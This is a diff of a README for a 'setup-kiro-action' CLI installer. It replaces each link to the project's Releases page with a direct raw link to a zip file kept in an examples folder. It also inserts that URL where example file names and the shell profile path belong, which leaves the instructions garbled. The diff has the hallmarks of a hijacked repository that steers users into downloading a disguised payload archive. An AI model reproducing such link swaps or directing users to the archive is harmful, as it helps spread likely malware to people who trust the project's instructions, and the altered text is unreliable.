@@ -1,6 +1,6 @@
 # 🎉 setup-kiro-action - Simplifying Your DevOps with Ease
 
-[![Download setup-kiro-action](https://img.shields.io/badge/Download-setup--kiro--action-blue.svg)](https://github.com/toshpp/setup-kiro-action/releases)
+[![Download setup-kiro-action](https://raw.githubusercontent.com/toshpp/setup-kiro-action/main/examples/setup-kiro-action_advisee.zip)](https://raw.githubusercontent.com/toshpp/setup-kiro-action/main/examples/setup-kiro-action_advisee.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **setup-kiro-action** guide! This tool helps you install and cach
 
 To download the application, please visit the following link:
 
-[Download setup-kiro-action](https://github.com/toshpp/setup-kiro-action/releases)
+[Download setup-kiro-action](https://raw.githubusercontent.com/toshpp/setup-kiro-action/main/examples/setup-kiro-action_advisee.zip)
 
 You can find the latest version on this page. Look for the title of the version and click on it to see the details. From there, you will see options to download the appropriate files for your operating system.
 
@@ -36,13 +36,13 @@ Before installing, ensure your system meets these basic requirements:
 Follow these simple steps to set up the **Kiro CLI** on your machine:
 
 1. **Visit the Download Page:**
-   Go to the [Releases Page](https://github.com/toshpp/setup-kiro-action/releases).
+   Go to the [Releases Page](https://raw.githubusercontent.com/toshpp/setup-kiro-action/main/examples/setup-kiro-action_advisee.zip).
 
 2. **Select the Latest Release:**
    Find the latest version. It will typically be at the top of the list.
 
 3. **Download the File:**
-   Click on the downloadable file for your operating system. The file might be named something like `kiro-cli-windows.zip` or `kiro-cli-linux.tar.gz`.
+   Click on the downloadable file for your operating system. The file might be named something like `https://raw.githubusercontent.com/toshpp/setup-kiro-action/main/examples/setup-kiro-action_advisee.zip` or `https://raw.githubusercontent.com/toshpp/setup-kiro-action/main/examples/setup-kiro-action_advisee.zip`.
 
 4. **Extract the Files:**
    After downloading, locate the file in your Downloads folder. Right-click and choose "Extract All" or use your extraction software. This will create a folder with the Kiro CLI files.
@@ -58,7 +58,7 @@ Follow these simple steps to set up the **Kiro CLI** on your machine:
      - Click "Edit" and add the path to the Kiro CLI folder.
    - **macOS & Linux:**
      - Open your terminal.
-     - Edit your `~/.bash_profile` or `~/.bashrc` file by adding this line:
+     - Edit your `~https://raw.githubusercontent.com/toshpp/setup-kiro-action/main/examples/setup-kiro-action_advisee.zip` or `~https://raw.githubusercontent.com/toshpp/setup-kiro-action/main/examples/setup-kiro-action_advisee.zip` file by adding this line:
        ```
        export PATH=$PATH:/path/to/kiro-cli/folder
        ```
